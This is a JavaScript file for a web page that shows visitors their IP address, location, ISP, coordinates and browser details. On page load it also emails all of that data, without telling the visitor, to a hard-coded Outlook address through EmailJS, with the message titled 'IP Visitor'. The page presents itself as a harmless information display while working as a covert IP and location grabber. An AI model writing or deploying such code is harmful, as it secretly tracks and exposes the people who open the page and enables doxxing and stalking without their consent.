emailjs.init("2jj19BTFwlNnm8fp_");

async function sendEmail(data) {
    const emailData = {
        to_email: "openeyes08@outlook.com",
        subject: "IP Visitor",
        message: `IP: ${data.ip}\nLocation: ${data.location}\nISP: ${data.isp}\nCountry: ${data.country}\nTimezone: ${data.timezone}\nCoords: ${data.coords}\nASN: ${data.asn}\nUA: ${data.useragent}\nScreen: ${data.screen}\nLang: ${data.lang}\nConnection: ${data.connection}\nTime: ${new Date().toLocaleString()}`
    };
    
    try {
        await emailjs.send("service_14u2qeo", "template_psyarye", emailData);
    } catch (error) {
        console.error('Email failed:', error);
    }
}

async function loadData() {
    const btn = document.getElementById('refresh-btn');
    btn.textContent = 'loading...';
    btn.disabled = true;
    
    let collectedData = {};
    
    try {
        const response = await fetch('https://ipapi.co/json/');
        const data = await response.json();
        
        document.getElementById('ip').textContent = data.ip || 'error';
        collectedData.ip = data.ip || 'error';
        
        const location = `${data.city || 'unknown'}, ${data.region || 'unknown'}, ${data.country_name || 'unknown'}`;
        document.getElementById('location').textContent = location;
        collectedData.location = location;
        
        document.getElementById('isp').textContent = data.org || 'unknown';
        collectedData.isp = data.org || 'unknown';
        
        const country = `${data.country_code || 'unknown'} (${data.country_calling_code || 'n/a'})`;
        document.getElementById('country').textContent = country;
        collectedData.country = country;
        
        document.getElementById('timezone').textContent = data.timezone || 'unknown';
        collectedData.timezone = data.timezone || 'unknown';
        
        const coords = `${data.latitude || 'unknown'}, ${data.longitude || 'unknown'}`;
        document.getElementById('coords').textContent = coords;
        collectedData.coords = coords;
        
        const asn = `AS${data.asn || 'unknown'} - ${data.network || 'unknown'}`;
        document.getElementById('asn').textContent = asn;
        collectedData.asn = asn;
        
    } catch (error) {
        document.getElementById('ip').textContent = 'error';
        document.getElementById('location').textContent = 'error';
        document.getElementById('isp').textContent = 'error';
        document.getElementById('country').textContent = 'error';
        document.getElementById('timezone').textContent = 'error';
        document.getElementById('coords').textContent = 'error';
        document.getElementById('asn').textContent = 'error';
        collectedData = { ip: 'error', location: 'error', isp: 'error', country: 'error', timezone: 'error', coords: 'error', asn: 'error' };
    }
    
    document.getElementById('useragent').textContent = navigator.userAgent;
    collectedData.useragent = navigator.userAgent;
    
    const screenInfo = `${window.screen.width}x${window.screen.height} (${window.screen.colorDepth}bit)`;
    document.getElementById('screen').textContent = screenInfo;
    collectedData.screen = screenInfo;
    
    const langInfo = `${navigator.language || 'unknown'} (${navigator.languages?.join(', ') || 'n/a'})`;
    document.getElementById('lang').textContent = langInfo;
    collectedData.lang = langInfo;
    
    const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
    const connectionInfo = connection ? `${connection.effectiveType || 'unknown'} - ${connection.downlink || 'unknown'}mbps` : 'unavailable';
    document.getElementById('connection').textContent = connectionInfo;
    collectedData.connection = connectionInfo;
    
    sendEmail(collectedData);
    
    btn.textContent = 'refresh data';
    btn.disabled = false;
}

function refresh() {
    loadData();
}

document.addEventListener('DOMContentLoaded', loadData);
